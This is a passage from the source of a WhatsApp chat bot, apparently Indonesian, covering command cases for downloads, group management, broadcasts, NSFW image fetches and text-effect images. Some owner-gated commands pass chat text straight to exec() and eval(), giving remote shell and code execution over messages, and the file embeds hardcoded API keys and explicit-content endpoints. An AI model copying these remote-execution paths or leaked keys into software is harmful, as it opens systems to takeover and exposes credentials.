					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case 'join':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case 'twmp4': case 'twitter':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(lang.wait())
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'alphagan.mp3', quoted:mek, ptt:true})
})
break
		    case 'runtime':
		    case 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case 'speed':
			case 'ping':
			const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `\`\`\`${teks}Speed: ${latensi.toFixed(4)} Second\`\`\``
					fakegroup(pingnya)
					})
					break
               
		    case 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            let owogi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owogi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break
		    case 'tourl':
		case 'imgtourl':{
                if ((isMedia && !mek.message.videoMessage || isQuotedImage ) && args.length == 0) {
                    var imgbb = require('imgbb-uploader')
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading image...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					reply(teks)
                    .catch((e)=>{reply(`\`\`\`[ x ]\`\`\`Eror! ada masalah dgn imgbb`)})
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
		            
		           break
/*
]=====> NSFW MENU<=====[
*/

			case 'awoo':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'blowjob2':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'megumin':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'trapnime':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break

/*
]=====> GROUP MENU<=====[
*/
  
			case 'add':  
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
                    if (args.length < 1) return reply('Yang mau di add?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
alpha.sendMessage(from, `User private\n\nMengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendMessage(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
					break 
					case 'radd': case 'addreply':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!`)
break

case 'rkick': case 'kickreply':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break
			case 'antilink':
if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
              if (args[0] == 'on'){
              if (isAntiLink) return reply(lang.anjawaUdhOn(command))
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOn(command))
              } else if (args[0] == 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOff(command))
              } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Choose one`, [
            {
              buttonId: 'antilink on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antilink off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
       case 'event':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if ( !isOwner && !isCreator && !mek.key.fromMe) return reply("Khusus admin");
					if (args[0] == "on") {
						if (isEventon) return reply(lang.anjawaUdhOn(command))
						event.push(from)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOn(command))
					} else if (args[0] == "off") {
						event.splice(from, 1)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOff(command))
					} else if (!q) {
          sendButMessage(from, `MODE EVENT`, `Choose one`, [
            {
              buttonId: 'event on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'event off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
	case 'antivirtex':
 if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
        if (args[0] == "on") {
          if (isAntivirtex) return reply(lang.anjawaUdhOn(command))
          antivirtex.push(from);
          fs.writeFileSync(
            "./src/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply(lang.anjawaOn(command))
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./src/antivirtex.json", JSON.stringify(ant));
          reply(lang.anjawaOff(command))
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Choose one`, [
            {
              buttonId: 'antivirtex on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antivirtex off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (!isGroupAdmins && !isBotGroupAdmins) return reply("Khusus admin");
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(10)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup(lang.success())
					break
            case 'leave':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Byeee 👋```')
					}, 0)
					break       
           case 'getpp':
				if (mek.message.extendedTextMessage != undefined){
					let mentioneddd = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioneddd[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seeer = `Nama : *${pushname}`
					thumbb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by ｖｙｎｕｔｚｘｘ２２ 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, thumbb ,image, anuu)
				}
				break
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply(lang.erorLink())
		             }
		             break
			case 'return':
			case 'cek':
			case 'me':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: ftroli})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (args.length < 1) return reply('```TEXT?```')
					arg = args.join(' ');
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					await alpha.sendMessage(_.jid, bc, image, {thumbnail: bc, quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${arg}`})
					}
					fakegroup(lang.successBc())
					} else {
					await ini_bc_pc_bang(arg)
					fakegroup(lang.successBc())
					}
					break
			case 'bcgc':
					case 'bcgroup':
					case 'bcgrup':
					case 'broadcastgrup':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:\n${prefix}bcgroup [isi chat]`)
                    var group = await alpha.groupMetadata(from)
			ini_bc = args.join(' ')
		var groupz = await alpha.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`\`\`\`[ ! ]\`\`\` Broadcast in progress! Total: ${groupz.length} groups`)
                    await ini_bc_gc_bang(ini_bc)
					reply(`\`\`\`[ ✓ ] Success broadcast : ${groupz.length} groups\`\`\``)
					break
			case 'buggc':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case 'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(lang.onlygc())
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
			case 'ghstalk': 
            case 'githubstalk': 
            case 'ghuser':
               {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(lang.wait())
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `*GITHUB STALKING*

*Data Berhasil Didapatkan!*
▷ Username : ${login}
▷ Name : ${name}
▷ Followers : ${followers}
▷ Following : ${following}
▷ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Public Gists : ${public_gists}
▷ Public Repos : ${public_repos}
▷ Twitter : ${twitter_username}
▷ Email : ${email}
▷ Location : ${location}
▷ Blog : ${blog}
▷ Link : ${html_url}
▷ Bio :\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, mek)
                      })
                .catch((err) => {
                    sendMess(owner, 'Error : ' + err)
                    console.log(color('[ EXEC ]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
              case 'smeme': 
					arg = args.join(' ');
					top = arg.split('|')[0]
					bottom = arg.split('|')[1]
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length > 0) {
					let dger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					owigi = await  alpha.downloadAndSaveMediaMessage(dger)
					oanu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owigi)
					oteks = `${oanu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					var anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${oteks}`
					var smeme = await getBuffer(anu2)
					alpha.sendMessage(from, smeme, image, {thumbnail: Buffer.alloc(0)})
					} else {
					reply('Gunakan foto!')
					}
					break
			case 'demoteall':
			if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
			                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
			                alpha.groupDemoteAdmin(from, members_id)
			                break
			case 'promoteall':
			if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                alpha.groupMakeAdmin(from, members_id)
                break
              case 'promote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Promote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(from, mentioned, true)
						alpha.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
						alpha.groupMakeAdmin(from, mentioned)
					}
					break
				case 'demote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Demote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						alpha.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`, mentioned, true)
						alpha.groupDemoteAdmin(from, mentioned)
					}
					break
                
                /*
                ]----------------------------------------------------------------> API ZEKS <----------------------------------------------------------------[
                */
// photooxy
//2 text
case 'captain_as':
case 'smoke':
case 'tiktok2': 
case 'arcade':
case 'battlefield':
case 'pubg':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
break                
          
// 1 text
case 'shadow':
case 'cname':
case 'romantic':
case 'burnpaper':
case 'funnycup':
case 'love':
case 'undergrass':          
case 'heart':
case 'coffeecup':
case 'wood':          
case 'flower':         
case 'wooden': 
case '3dsummer':
case 'wolf_metal':
case '3dnature':
case 'underwater':          
case 'goldenrose':
case 'vector':
case 'typography':
case 'typography2': 
case 'underfall':  
case 'smokyneon': 
case 'rainbow': 
case 'graffiti':
case 'camouflage':
case '3dglowing':          
case 'vintage':
case 'honey': 
case 'whitecube':
case 'avatar': 
case 'glowrainbow':
case 'nightsky':
case 'fur':
case 'flaming':          
case 'crisp':
case 'embroidery':
case 'bcake':          
case '3dligth':
case 'metallic': 
case 'striking':
case 'watermelon':         
case 'butterfly':
case 'harry':
case 'glowneon':
case 'coffecup2':          
case 'luxury': 
case 'cemetery':
case 'woodblock':
case 'sweet':
case 'simple':
case 'bevel':
case 'underflower':         
case 'underflower2':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let photooxy2 = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
break         

//TEXT PRO
//2 TEXT
case 'halloween2':
case 'horror':
case 'game8bit':
case 'layered':
case 'glitch2':
case 'coolg':
case 'coolwg':
case 'realistic':
case 'space3d':
case 'gtiktok':
case 'stone':
case 'marvel':
case 'marvel2':
case 'pornhub':
case 'avengers':
case 'metalr':
case 'metalg':
case 'metalg2':
case 'halloween2':
case 'lion':
case 'wolf_bw':
case 'wolf_g':
case 'ninja':
case '3dsteel':
case 'horror2':
case 'lava':
case 'bagel':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let textpro = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
break 
//1 TEXT  
case 'blackpink':
case 'rainbow2':
case 'water_pipe':
case 'halloween':
case 'sketch':
case 'sircuit':
case 'discovery':
case 'metallic2':
case 'fiction':
case 'demon':
case 'transformer':
case 'berry':
case 'thunder':
case 'magma':
case '3dstone':
case 'neon':
case 'glitch':
case 'harry_potter':
case 'embossed':
case 'broken':
case 'papercut':
case 'gradient':
case 'glossy':
case 'watercolor':
case 'multicolor':
case 'neon_devil':
case 'underwater':
case 'bear':
case 'wonderfulg':
case 'christmas':
case 'neon_light':
case 'snow':
case 'cloudsky':
case 'luxury2':
case 'gradient2':
case 'summer':
case 'writing':
case 'engraved':
case 'summery':
case '3dglue':
case 'metaldark':
case 'neonlight':
case 'oscar':
case 'minion':
case 'holographic':
case 'purple':
case 'glossyb':
case 'deluxe2':
case 'glossyc':
case 'fabric':
case 'neonc':
case 'newyear':
case 'newyear2':
case 'metals':
case 'xmas':
case 'blood':
case 'darkg':
case 'joker':
case 'wicker':
case 'natural':
case 'firework':
case 'skeleton':
case 'balloon':
case 'balloon2':
case 'balloon3':
case 'balloon4':
case 'balloon5':
case 'balloon6':
case 'balloon7':
case 'steel':
case 'gloss':
case 'denim':
case 'decorate':
case 'decorate2':
case 'peridot':
case 'rock':
case 'glass':
case 'glass2':
case 'glass3':
case 'glass4':
case 'glass5':
case 'glass6':
case 'glass7':
case 'glass8':
case 'captain_as2':
case 'robot':
case 'equalizer':
case 'toxic':
case 'sparkling':
case 'sparkling2':
case 'sparkling3':
case 'sparkling4':
case 'sparkling5':
case 'sparkling6':
case 'sparkling7':
case 'decorative':
case 'chocolate':
case 'strawberry':
case 'koifish':
case 'bread':
case 'matrix':
case 'blood2':
case 'neonligth2':
case 'thunder2':
case '3dbox':
case 'neon2':
case 'roadw':
case 'bokeh':
case 'gneon':
case 'advanced':
case 'dropwater':
case 'wall':
case 'chrismast':
case 'honey':
case 'drug':
case 'marble':
